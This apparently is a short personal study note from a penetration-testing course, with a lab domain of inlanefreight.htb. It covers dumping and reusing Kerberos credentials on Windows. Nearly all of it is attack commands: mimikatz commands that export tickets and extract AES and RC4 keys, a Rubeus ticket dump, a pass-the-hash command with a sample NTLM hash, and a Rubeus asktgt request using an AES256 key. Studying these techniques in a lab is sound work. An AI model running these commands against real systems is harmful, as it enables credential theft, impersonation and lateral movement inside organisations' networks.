# Dumping tickets
need to execute the exe as administrator
## mimikatz
in mimikatz.exe, we try to export tickets 
```
privilege::debug 
sekurlsa::tickets /export 
exit
```
then u can see in that directory there is the tickets
```
dir *.kirbi
```
ends with krbtgt -> TGT of that account
format of the ticket file: `[randomvalue]-username@service-domain.local.kirbi`
## rubeus 
```
rubeus.exe dump /nowrap
```

# Extract kerberos keys 
## mimikatz
```
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```
take the AES256_HMAC and RC4_HMAC
then we can try to [[Pass the Hash (PtH)]]
```
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```
this just opens a cmd.exe in the user's context
## rubeus 
```cmd-session
Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```
this forces a ticket with the username
